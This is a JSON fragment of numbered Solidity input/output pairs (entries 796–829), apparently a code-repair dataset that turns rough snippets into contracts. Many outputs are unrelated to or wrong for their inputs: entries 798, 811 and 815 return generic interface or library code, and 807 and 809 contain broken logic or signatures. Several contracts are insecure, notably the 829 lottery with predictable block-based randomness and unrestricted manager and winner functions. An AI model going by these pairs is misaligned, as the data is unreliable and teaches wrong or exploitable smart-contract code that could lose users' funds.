        "input": "pragma solidity >= 0.7.0 < 0.9.0;\n\ncontract receiverContract {\n\n    event Log(uint);\n    address public recipient;\n\n    constructor () {\n        recipient = address(this);\n    } \n\n    fallback () external payable {\n        emit Log(gasleft());\n    } \n\n    receive () external payable {}\n\n    function getThisAddress() public view returns(address) {\n        return address(this);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n\n}\n\n\n\ncontract senderContract is receiverContract {\n\n    address _recipient=super.getThisAddress();\n\n\n    function manualTransfer (address payable _to) public payable {\n        _to.transfer(msg.value);\n    }\n\n    function autoTransfer () public payable {\n        payable(_recipient).transfer(msg.value);\n    }\n\n}\n\n\n",
        "output": "pragma solidity >= 0.7.0 < 0.9.0;\n\ncontract receiverContract {\n\n    event Log(uint);\n    address public recipient;\n\n    constructor () {\n        recipient = address(this);\n    } \n\n    fallback () external payable {\n        emit Log(gasleft());\n    } \n\n    receive () external payable {}\n\n    function getThisAddress() public view returns(address) {\n        return address(this);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n\n}\n\n\n\ncontract senderContract is receiverContract {\n\n    address _recipient=super.getThisAddress();\n\n// please see https://docs.soliditylang.org/en/v0.8.14/contracts.html?highlight=super \n//to understand how \"super\" works\n\n    function manualTransfer (address payable _to) public payable {\n        _to.transfer(msg.value);\n    }\n\n    function autoTransfer () public payable {\n        payable(_recipient).transfer(msg.value);\n    }\n\n}\n\n"
    },
    "796.sol": {
        "input": "mapping(uint256 => Placeholder) public placeholder;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Placeholder {\n\n    mapping(uint256 => Placeholder) public placeholder;\n\n}\n\n"
    },
    "797.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\npragma experimental ABIEncoderV2;\n\ncontract ToDoList {\n    ...\n   mapping(address => Task[]) public tasks;\n\n    event AddTask(address indexed creator, uint256 indexed id, string description);\n\n    function addTask(string memory _description) public {\n        uint256 id = uint256(\n            keccak256(abi.encodePacked(msg.sender, _description))\n        );\n\n        tasks[msg.sender].push(\n            Task({id: id, description: _description, completed: false})\n        );\n\n        emit AddTask(msg.sender,id,_description);\n    }\n\n...\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ToDoList {\n    event AddTask(address indexed creator, uint256 indexed id, string description);\n\n    struct Task {\n        uint256 id;\n        string description;\n        bool completed;\n    }\n\n    mapping(address => Task[]) public tasks;\n\n    function addTask(string memory _description) public {\n        uint256 id = uint256(\n            keccak256(abi.encodePacked(msg.sender, _description))\n        );\n\n        tasks[msg.sender].push(\n            Task({id: id, description: _description, completed: false})\n        );\n\n        emit AddTask(msg.sender,id,_description);\n    }\n}\n\n"
    },
    "798.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/access/AccessControl.sol\";\nimport \"./SUSHI.sol\";\n\ncontract BNB is ERC20, Ownable, AccessControl{\n\n    string tokenName = \"BNB token\";\n    string tokenSymbol = \"BNB\";\n    uint decimal = 2;\n    uint initFund = ...;\n    uint rate = 32;\n\n    constructor() ERC20 (tokenName, tokenSymbol){\n        _mint(msg.sender, initFund);\n    }\n\n    function setRate(uint _rate) public onlyOwner {\n        rate = _rate;\n    }\n    function getRate() public view returns(uint) {\n        return rate;\n    }\n\n    function buyBNB(uint _amount){\n        address owner = owner();\n        require(_amount * rate == msg.value)\n        transfer(msg.sender, _amount)\n    }\n    function exchange(uint _amount){\n        SUSHI sushi = SUSHI(address(this));\n        uint sushiRate = sushi.getRate();\n        require(sushi.balanceOf(msg.sender) >= _amount * sushiRate / rate)\n        transfer(msg.sender, _amount);\n    }\n    \n    receive() payable {}\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    interface ERC20 {\n        function transfer(address to, uint value) external returns (bool);\n        function totalSupply() external view returns (uint);\n        function balanceOf(address who) external view returns (uint);\n        function allowance(address owner, address spender) external view returns (uint);\n    }\n\n"
    },
    "799.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    receive() external payable {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    receive() external payable {\n        // executed when the `data` field is empty and `value` is > 0\n    }\n}\n\n"
    },
    "800.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract NFT is ERC721Enumerable, Ownable {\n  using Strings for uint256;\n\n  string public baseURI;\n  string public baseExtension = \".json\";\n  uint256 public cost = 0.05 ether;\n  uint256 public maxSupply = 300;\n  uint256 public maxMintAmount = 10;\n  bool public paused = false;\n  mapping(address => bool) public whitelisted;\n\n  constructor(\n    string memory _name,\n    string memory _symbol,\n    string memory _initBaseURI\n  ) ERC721(_name, _symbol) {\n    setBaseURI(_initBaseURI);\n    mint(msg.sender, 20);\n  }\n  \n  function _baseURI() internal view virtual override returns (string memory) {\n    return baseURI;\n  }\n\n  function mint(address _to, uint256 _mintAmount) public payable {\n    uint256 supply = totalSupply();\n    require(!paused, \"msg1\");\n    require(_mintAmount > 0, \"msg2\");\n    require(_mintAmount <= maxMintAmount, \"msg3\");\n    require(supply + _mintAmount <= maxSupply, \"msg4\");\n\n    if (msg.sender != owner()) {\n        if(whitelisted[msg.sender] != true) {\n          require(msg.value >= cost * _mintAmount, \"msg5\");\n        }\n    }\n\n    for (uint256 i = 1; i <= _mintAmount; i++) {\n      _safeMint(_to, supply + i);\n    }\n  }\n\n  function walletOfOwner(address _owner)\n    public\n    view\n    returns (uint256[] memory)\n  {\n    uint256 ownerTokenCount = balanceOf(_owner);\n    uint256[] memory tokenIds = new uint256[](ownerTokenCount);\n    for (uint256 i; i < ownerTokenCount; i++) {\n      tokenIds[i] = tokenOfOwnerByIndex(_owner, i);\n    }\n    return tokenIds;\n  }\n\n  function tokenURI(uint256 tokenId)\n    public\n    view\n    virtual\n    override\n    returns (string memory)\n  {\n    require(\n      _exists(tokenId),\n      \"ERC721Metadata: URI query for nonexistent token\"\n    );\n\n    string memory currentBaseURI = _baseURI();\n    return bytes(currentBaseURI).length > 0\n        ? string(abi.encodePacked(currentBaseURI, tokenId.toString(), baseExtension))\n        : \"\";\n  }\n\n  function setCost(uint256 _newCost) public onlyOwner {\n    cost = _newCost;\n  }\n\n  function setmaxMintAmount(uint256 _newmaxMintAmount) public onlyOwner {\n    maxMintAmount = _newmaxMintAmount;\n  }\n\n  function setBaseURI(string memory _newBaseURI) public onlyOwner {\n    baseURI = _newBaseURI;\n  }\n\n  function setBaseExtension(string memory _newBaseExtension) public onlyOwner {\n    baseExtension = _newBaseExtension;\n  }\n\n  function pause(bool _state) public onlyOwner {\n    paused = _state;\n  }\n \n function whitelistUser(address _user) public onlyOwner {\n    whitelisted[_user] = true;\n  }\n \n  function removeWhitelistUser(address _user) public onlyOwner {\n    whitelisted[_user] = false;\n  }\n\n  function withdraw() public payable onlyOwner {\n    (bool hs, ) = payable(0x985C134D876439d92De8DD3c6e7d66dd420D481a).call{value: address(this).balance * 5 / 100}(\"\");\n    require(hs, \"msg6\");\n\n    (bool os, ) = payable(owner()).call{value: address(this).balance}(\"\");\n    require(os, \"msg7\");\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address, uint256) external returns (bool);\n}\n\n"
    },
    "801.sol": {
        "input": "contract Chainlink is usingOraclize {\n    string public EURUSD;\n    function updatePrice() public payable {\n        if (oraclizegetPrice(\"URL\") > this.balance) { \n        } else {\n            oraclizequery(\"URL\", \"json(http:\n        }\n    }\n    function _callback(bytes32 myid, string result) public {\n        require(msg.sender == oraclizecbAddress());\n        EURUSD = result;\n    }\n}\n\n  contract DummyContract {\n    event LogSent(bytes32 data);\n    function sendData(address otherContractAddress, bytes32 data) public {\n        if (someCondition) {\n            someFunction();\n        }\n\n    emit LogSent(data);\n    otherContractAddress.call(data);\n\n    Oracle.sendData(data);\n}\n\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DummyContract {\n    event LogSent(bytes32 data);\n\n    function sendData(address otherContractAddress, bytes32 data) public {\n        require(otherContractAddress != address(0), \"Invalid address\");\n        (bool success,) = otherContractAddress.call(abi.encodePacked(data));\n        require(success, \"Call failed\");\n        emit LogSent(data);\n    }\n}\n\n"
    },
    "802.sol": {
        "input": "import \"hardhat/console.sol\";\n\nconsole.log(variable); \nconsole.log(1234); \n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary Constant {\n    \n    function getConstant() internal view returns (uint256) {\n        return 1234;\n    }\n\n}\n\n"
    },
    "803.sol": {
        "input": "constructor() public {\n  _name = {{TOKEN_NAME}};\n  _symbol = {{TOKEN_SYMBOL}};\n  _decimals = {{DECIMALS}};\n  _totalSupply = {{TOTAL_SUPPLY}};\n  _balances[msg.sender] = _totalSupply;\n\n  emit Transfer(address(0), msg.sender, _totalSupply);\n}\n\nconstructor() public {\n  _name = \"MyToken\";\n  _symbol = \"MyT\";\n  _decimals = 18;\n  _totalSupply = 1000000000000000000;\n  _balances[msg.sender] = _totalSupply;\n\n  emit Transfer(address(0), msg.sender, _totalSupply);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    string public _name;\n    string public _symbol;\n    uint8 public _decimals;\n    uint256 public _totalSupply;\n\n    mapping(address => uint256) public _balances;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor() public {\n        _name = \"MyToken\";\n        _symbol = \"MyT\";\n        _decimals = 18;\n        _totalSupply = 1000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return _balances[_owner];\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(_balances[msg.sender] >= _value, \"Insufficient balance.\");\n        _balances[msg.sender] -= _value;\n        _balances[_to] += _value;\n        emit Transfer(msg.sender, _to, _value);\n        return true;\n    }\n}\n\n"
    },
    "804.sol": {
        "input": "\ncontract minter{\n\n  mapping(address => bool) public whiteList;\n\n  function whiteLister( address _user) public{\n    whiteList[_user] = true;   \n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract minter {\n\n  mapping(address => bool) public whiteList;\n\n  \n  function whiteLister( address _user) external {\n    whiteList[_user] = true;\n  \n  }\n\n}\n\n"
    },
    "805.sol": {
        "input": " uint public highestPrice=0 \n mapping(uint->string) public highestSoldNft\n\nfunction mint(string memory tokenUri, uint price) public payable returns(uint){ \n    _safeMint(msg.sender,newTokenId);\n    if (price > highestPrice){\n        delete highestSoldNft[highestPrice]\n        setHighestPrice(price)\n        setHighestSoldNft(tokenUri,price)\n    }}\n\n    function setHighestPrice(uint price) public private {\n        highestPrice=price\n    }\n    \n    function setHghestSoldNft(string memory tokenUri,uint price) public private{\n        highestSoldNft[price]=tokenUri\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NFTContract {\n    uint public highestPrice = 0;\n    mapping(uint => string) public highestSoldNft;\n\n    function mint(string memory tokenUri, uint price) public payable returns(uint) {\n        // Mint new token and get the new token ID\n        uint newTokenId = 1; // Replace with the logic to generate new token ID\n\n        _safeMint(msg.sender, newTokenId);\n        if (price > highestPrice) {\n            delete highestSoldNft[highestPrice];\n            setHighestPrice(price);\n            setHighestSoldNft(tokenUri, price);\n        }\n        return newTokenId;\n    }\n\n    function setHighestPrice(uint price) private {\n        highestPrice = price;\n    }\n    \n    function setHighestSoldNft(string memory tokenUri, uint price) private {\n        highestSoldNft[price] = tokenUri;\n    }\n\n    function _safeMint(address to, uint tokenId) internal virtual {\n        // Add the logic to mint the new token safely\n    }\n}\n"
    },
    "806.sol": {
        "input": "allowance[B][C] = 10;\n\nallowance[B][C] =  allowance[B][C] - 6; (10-6 --> C still can send 4 tokens from now on)\n\nallowance[deployer][exchange] =  allowance[deployer][exchange] - _value;\n\nallowance[deployer][exhange] = _value;\n\ntoken.transferFrom(deployer, receiver, amount).send( { from: exchange } )\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "807.sol": {
        "input": "constructor(string memory initialMessage) public {\n        message = initialMessage;\n    }\n\nconst Inbox = artifacts.require(\"Inbox\");\n\nmodule.exports = function (deployer) {\n  deployer.deploy(Inbox, \"myInitialMessage\");\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Inbox {\n\n    string public message;\n\n    constructor(string memory initialMessage) public {\n        message = initialMessage;\n    }\n\n    function sendMessage(string memory message) public {\n        message = message;\n    }\n}\n\n"
    },
    "808.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address owner = address(0x123);\n\n    function foo() external payable {\n        require(msg.value == 1e18);\n\n        payable(owner).transfer(msg.value);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address owner = address(0x123);\n\n    // `payable` modifier allows the function to accept ETH\n    function foo() external payable {\n        // validate that the received amount is 1e18 wei (1 ETH)\n        require(msg.value == 1e18);\n\n        // typecast `address` variable (name `owner`)\n        // to `address payable` and effectively redirect the received value\n        // with the native `transfer()` function of the `address payable` type\n        payable(owner).transfer(msg.value);\n    }\n}\n\n"
    },
    "809.sol": {
        "input": "pragma solidity ^0.8.0;\nimport \"@0xcyphered/secp256k1-solidity/contracts/SECP256K1.sol\";\ncontract Example {\n    function recoverPersonalSignPublicKey(\n        bytes32 message,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public pure returns (bytes memory) {\n        string memory header = '\\x19Ethereum Signed Message:\\n32';\n        bytes32 _message = keccak256(abi.encodePacked(header, message));\n        (uint256 x, uint256 y) = SECP256K1.recover(uint256(_message), v - 27, uint256(r), uint256(s));\n        return abi.encodePacked(x, y);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract SECP256K1 {\n    function recover(\n        uint256 r,\n        uint8 s,\n        uint256 v\n    ) public pure returns (uint256 x, uint256 y);\n}\n\n"
    },
    "810.sol": {
        "input": "pragma solidity ^0.8.0;\n\ninterface ICounter {\n    function increment() external;\n}\n\ncontract MyContract {\n    ICounter counter;\n\n    constructor(address _counter) {\n        counter = ICounter(_counter);\n    }\n\n    function incrementCount() external {\n        counter.increment();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.0;\n\ninterface ICounter {\n    function increment() external;\n}\n\ncontract MyContract {\n    ICounter counter;\n\n    constructor(address _counter) {\n        counter = ICounter(_counter);\n    }\n\n    function incrementCount() external {\n        counter.increment();\n    }\n}\n\n"
    },
    "811.sol": {
        "input": "    function getPayout(address payable addressOfProposer)\n        public\n        returns (bool)\n    {\n        uint256 allowanceAvailable = _payoutTotals[addressOfProposer];\n        require(allowanceAvailable > 0, \"You do not have any funds available.\");\n\n        _decreasePayout(addressOfProposer, allowanceAvailable);\n\n        (bool sent, ) = addressOfProposer.call{value: allowanceAvailable}(\"\");\n        require(sent, \"Failed to send ether\");\n\n        emit Withdraw(addressOfProposer, allowanceAvailable);\n        return true;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \" mul failed\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0, \" div by zero\");\n        return a / b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b <= a, \"sub failed\");\n        return a - b;\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"add failed\");\n\n        return c;\n    }\n}\n\n"
    },
    "812.sol": {
        "input": "    function addVoter() public {\n        voted[msg.sender] = false;\n    }\n\n function vote(uint _candidateId) public {\n        require(!voted[msg.sender], \"You have already voted\");\n        require(candidates[_candidateId].id != 0, \"Candidate does not exist\");\n        voted[msg.sender]= true;\n        candidates[_candidateId].voteCount++;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ElectionVoting {\n  struct Candidate {\n    uint id;\n    string name;\n    string description;\n    uint voteCount;\n  }\n\n  mapping(address => bool) public voted;\n  \n  mapping(uint => Candidate) public candidates;\n  \n  \n  function addVoter() public {\n    voted[msg.sender] = false;\n  }\n\n  \n  function vote(uint _candidateId) public {\n    require(!voted[msg.sender], \"You have already voted\");\n    require(candidates[_candidateId].id != 0, \"Candidate does not exist\");\n    voted[msg.sender]= true;\n    candidates[_candidateId].voteCount++;\n  }\n  \n}\n\n"
    },
    "813.sol": {
        "input": "constructor() {\n    owner = msg.sender;\n}\n\nfunction transferOwnership(address newOwner) external onlyOwner {\n    owner = newOwner;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownership {\n    \n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Caller is not the owner\");\n        _;\n    }\n\n    function transferOwnership(address newOwner) external onlyOwner {\n        owner = newOwner;\n    }\n\n}\n\n"
    },
    "814.sol": {
        "input": "PoliticalParty[] public winners;\nfunction declareWinner() public onlyOwner returns(PoliticalParty[] memory)\n    {\n       require(votingState == State.Canceled || block.timestamp > votingEndTime);\n       if(votingState == State.Canceled){\n           revert(\"Voting canceled.\");\n       }\n\n       else{\n       string memory _name=\"\";\n        uint256 max_count=0;\n        \n        for (uint256 i = 0; i < parties.length; i++) {\n            if (parties[i].voteCount>max_count) {\n                max_count = parties[i].voteCount;\n                _name=parties[i].name;\n                delete winners;\n            winners.push(PoliticalParty({name: _name, voteCount: max_count}));\n            }\n            else if (max_count==parties[i].voteCount) {\n                _name=parties[i].name;\n                winners.push(PoliticalParty({name:_name, voteCount: max_count}));\n                winnercount++;\n            }\n             \n        }\n        return winners;\n       }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Election {\n    enum State {Voting, Canceled}\n    State public votingState;\n    uint256 public votingEndTime;\n    address public owner;\n\n    struct PoliticalParty {\n        string name;\n        uint256 voteCount;\n    }\n\n    PoliticalParty[] public parties;\n    PoliticalParty[] public winners;\n\n    constructor(uint256 _votingDuration) {\n        owner = msg.sender;\n        votingEndTime = block.timestamp + _votingDuration;\n        votingState = State.Voting;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function.\");\n        _;\n    }\n\n    function declareWinner() public onlyOwner returns(PoliticalParty[] memory)\n    {\n        require(votingState == State.Canceled || block.timestamp > votingEndTime);\n        if(votingState == State.Canceled){\n            revert(\"Voting canceled.\");\n        }\n        else{\n            string memory _name=\"\";\n            uint256 max_count=0;\n            for (uint256 i = 0; i < parties.length; i++) {\n                if (parties[i].voteCount>max_count) {\n                    max_count = parties[i].voteCount;\n                    _name=parties[i].name;\n                    delete winners;\n                    winners.push(PoliticalParty({name: _name, voteCount: max_count}));\n                }\n                else if (max_count==parties[i].voteCount) {\n                    _name=parties[i].name;\n                    winners.push(PoliticalParty({name:_name, voteCount: max_count}));\n                }\n            }\n            return winners;\n        }\n    }\n\n    function cancelVoting() public onlyOwner {\n        votingState = State.Canceled;\n    }\n}\n\n"
    },
    "815.sol": {
        "input": "constructor(address[] _teammates)\n    for(uint256 i = 0; i < _teammates.length; i++){\n        _mint(_teammates[i], i); \n    }\n}\n\nconstructor(address[] _teammates)\n    teammates = _teammates;\n}\n\nfunction distributeTokensToTeam() public onlyOwner{\n    for(uint256 i = 0; i < teammates.length; i++){\n        transfer(teammates[i], i); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\n"
    },
    "816.sol": {
        "input": "pragma solidity 0.8.17;\n\nmodule.exports = {\n    solidity: \"0.8.17\",\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Response {\n}\n\n"
    },
    "818.sol": {
        "input": "function doSomething() external {\n  string d5;\n  (,,,,d5,,) = keepData.getData();\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n  KeepData keepData;\n  \n  constructor(address _keepDataAddress) {\n    keepData = KeepData(_keepDataAddress);\n  }\n  \n  function doSomething() external {\n    string memory d5;\n    (,,,,d5,,) = keepData.getData();\n    // Do something with d5\n  }\n}\n\ncontract KeepData {\n  function getData() external view returns (string memory, string memory, string memory, string memory, string memory, string memory, string memory) {\n    // Implement logic to retrieve data\n  }\n}\n"
    },
    "819.sol": {
        "input": "address[] memory path = new address[](2);\npath[0] = address(DAI);\npath[1] = address(USDT);\nUniswapV2Router02.swapExactTokensForTokens(amountIn, amountOutMin, path, msg.sender, block.timestamp);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface UniswapV2Router02 {\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint blockTimeMax\n    ) external returns (uint amountOut);\n}\n\n"
    },
    "820.sol": {
        "input": "function setCounter(uint value) public payable {\n   require(msg.value >= 1 ether, \"Error msg here\");\n   if (msg.value > 1) {\n       payable(msg.sender).transfer(msg.value - 1 ether);\n   }\n   payable(\"your wallet address\").transfer(1 ether);\n\n   counter +=1;\n   emit SetCounter(value);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint public counter;\n    \n    event SetCounter(uint value);\n    \n    function setCounter(uint value) public payable {\n        require(msg.value >= 1 ether, \"Error: Insufficient funds\");\n        \n        if (msg.value > 1 ether) {\n            payable(msg.sender).transfer(msg.value - 1 ether);\n        }\n        \n        payable(address(this)).transfer(1 ether);\n\n        counter += 1;\n        emit SetCounter(value);\n    }\n}\n"
    },
    "821.sol": {
        "input": "import json\nfrom web3 import Web3, HTTPProvider\n\n# truffle development blockchain address\nblockchain_address = 'http\n#client instance to interact with the blockchain\nweb3 = Web3(HTTPProvider(blockchain_address))\n\ncompiled_contract_path = 'build/contracts/FirstContract.json'\ndeployed_contract_address = '0x'\n\nwith open(compiled_contract_path) as file:\n    contract_json = json.load(file) #load contract info as JSON\n    contract_abi = contract_json['abi']\n\ncontract = web3.eth.contract(address=deployed_contract_address, abi=contract_abi)\n\nresult = contract.functions.setValue(10).transact() #use transact to store value in blockchain\nprint(result)\nprint(result.hex())\nmessage = contract.functions.getValue().call()\nprint(message)\n\n\nabi = '[]'\n\nmessage = contract.functions.getValue().call()\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FirstContract {\n\n    uint public value;\n\n    constructor() public {\n        value = 10;\n    }\n\n    function setValue(uint amount) public {\n        value = amount;\n    }\n\n    function getValue() public view returns(uint) {\n        return value;\n    }\n}\n\n"
    },
    "823.sol": {
        "input": " function convert(bytes32 foo) public pure returns(string memory) {\n    string memory bar = string(abi.encodePacked(foo));\n    return bar;\n }\n\n function bytes32ToString(bytes32 _bytes32) public pure returns (string memory) {\n        uint8 i = 0;\n        while(i < 32 && _bytes32[i] != 0) {\n            i++;\n        }\n        bytes memory bytesArray = new bytes(i);\n        for (i = 0; i < 32 && _bytes32[i] != 0; i++) {\n            bytesArray[i] = _bytes32[i];\n        }\n        return string(bytesArray);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Abicoder {\n    function convert(bytes32 foo) public pure returns(string memory) {\n    string memory bar = string(abi.encodePacked(foo));\n    return bar;\n }\n\n function bytes32ToString(bytes32 _bytes32) public pure returns (string memory) {\n        uint8 i = 0;\n        while(i < 32 && _bytes32[i] != 0) {\n            i++;\n        }\n        bytes memory bytesArray = new bytes(i);\n        for (i = 0; i < 32 && _bytes32[i] != 0; i++) {\n            bytesArray[i] = _bytes32[i];\n        }\n        return string(bytesArray);\n    }\n}\n\n"
    },
    "824.sol": {
        "input": "function reduce(uint256[] arr) pure internal returns (uint256 result){\n    for (uint256 i = 0; i < arr.length; i++) {\n        result += arr[i];\n    }\n \n    return;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Addition {\n\n    function reduce(uint256[] arr) pure internal returns (uint256 result){\n    for (uint256 i = 0; i < arr.length; i++) {\n        result += arr[i];\n    }\n \n    return;\n}\n}\n\n"
    },
    "825.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Game {\n        address[] participants;\n        uint amountRequired;\n        uint Duration;\n        uint id;\n        bool ended;\n        uint createdTime;\n    }\n\n    mapping(uint => Game) public games;\n\n    function CreateGame(uint amountRequired, string memory timeoption) public {\n        address[] memory _participants; \n        uint gametime = 1;\n        uint gameid = 1;\n\n        Game memory newGame = Game({\n            participants: _participants,\n            amountRequired: amountRequired,\n            Duration: gametime,\n            id: gameid,\n            ended: false,\n            createdTime: block.timestamp\n        });\n\n        games[gameid] = newGame;\n    }\n\n    function addParticipant(uint gameId, address participant) public {\n        require(games[gameId].createdTime > 0, \"This game does not exist\");\n        games[gameId].participants.push(participant);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Game {\n        address[] participants;\n        uint amountRequired;\n        uint Duration;\n        uint id;\n        bool ended;\n        uint createdTime;\n    }\n\n    // create a storage mapping of value type `Game`\n    // id => Game\n    mapping(uint => Game) public games;\n\n    function CreateGame(uint amountRequired, string memory timeoption) public {\n        // dummy values\n        address[] memory _participants; // empty array by default\n        uint gametime = 1;\n        uint gameid = 1;\n\n        Game memory newGame = Game({\n            participants: _participants,\n            amountRequired: amountRequired,\n            Duration: gametime,\n            id: gameid,\n            ended: false,\n            createdTime: block.timestamp\n        });\n\n        // store the `memory` value into the `storage` mapping\n        games[gameid] = newGame;\n    }\n\n    function addParticipant(uint gameId, address participant) public {\n        require(games[gameId].createdTime > 0, \"This game does not exist\");\n        games[gameId].participants.push(participant);\n    }\n}\n\n"
    },
    "826.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external pure returns (uint8) {\n        uint16 larger = 512;           \n        uint8 smaller = uint8(larger); \n        return smaller;\n    }\n}\n\n10101011 11001101 10101011 11001101 \n10101011 11001101 10101011 11001101 \n10101011 11001101 10101011 11001101 \n10101011 11001101 10101011 11001101 \n00000000 00000000 00000000 00000000 \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function foo() external pure returns (uint8) {\n        uint16 larger = 512;           \n        uint8 smaller = uint8(larger); \n        return smaller;\n    }\n}\n\n"
    },
    "827.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Target {\n    uint public number = 100;\n}\n\ncontract Factory {\n    event DeployedTo(address);\n\n    function deploy(bytes memory code) public returns (address addr) {\n        assembly {\n            addr := create(0,add(code,0x20), mload(code))\n        }\n\n        emit DeployedTo(addr);\n    }\n\n    function deployTarget() public {\n        this.deploy(\n            hex\"60806040526064600055348015601457600080fd5b50607d806100236000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80638381f58a14602d575b600080fd5b603560005481565b60405190815260200160405180910390f3fea26469706673582212204222f4063ba77f82b7d8339b117fd0142d917b7d473221d6bb362a1467d5d83864736f6c63430008070033\"\n        );\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Target {\n    uint public number = 100;\n}\n\ncontract Factory {\n    event DeployedTo(address);\n\n    function deploy(bytes memory code) public returns (address addr) {\n        assembly {\n            addr := create(0,add(code,0x20), mload(code))\n        }\n\n        emit DeployedTo(addr);\n    }\n\n    function deployTarget() public {\n        this.deploy(\n            hex\"60806040526064600055348015601457600080fd5b50607d806100236000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80638381f58a14602d575b600080fd5b603560005481565b60405190815260200160405180910390f3fea26469706673582212204222f4063ba77f82b7d8339b117fd0142d917b7d473221d6bb362a1467d5d83864736f6c63430008070033\"\n        );\n    }\n}\n\n"
    },
    "829.sol": {
        "input": "pragma solidity ^0.8.11;\n\ncontract lottery\n{\n  address manager;\n    address payable[]  public players;\n\n\n  function setManager() public{\n      manager = msg.sender;\n  }\n  function enterLottery () public payable{\n    require(msg.value > 0.9 ether);\n    players.push(payable(msg.sender)); \n  }\nfunction random() private view returns(uint){\n    return uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp)));   \n  }\n\n  function winner() public payable{\n      uint index = random() % players.length;\n    players[index].transfer(address(this).balance);\n    players = new address payable[](0);\n\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract lottery {\n  address manager;\n    address payable[] public players;\n\n\n  function setManager () public  {\n      manager = msg.sender;\n  }\n\n  function enterLottery () public payable  {\n    require(msg.value > 0.9 ether);\n    players.push(payable(msg.sender)); \n  }\n function random() private view returns(uint)\n    {\n      return uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp))); \n    }\n\n  function winner () public payable  {\n    uint index = random()  % players.length;\n    players[index].transfer(address(this).balance);\n    players = new address payable[](0);\n  }\n}\n\n"
    },
    "830.sol": {
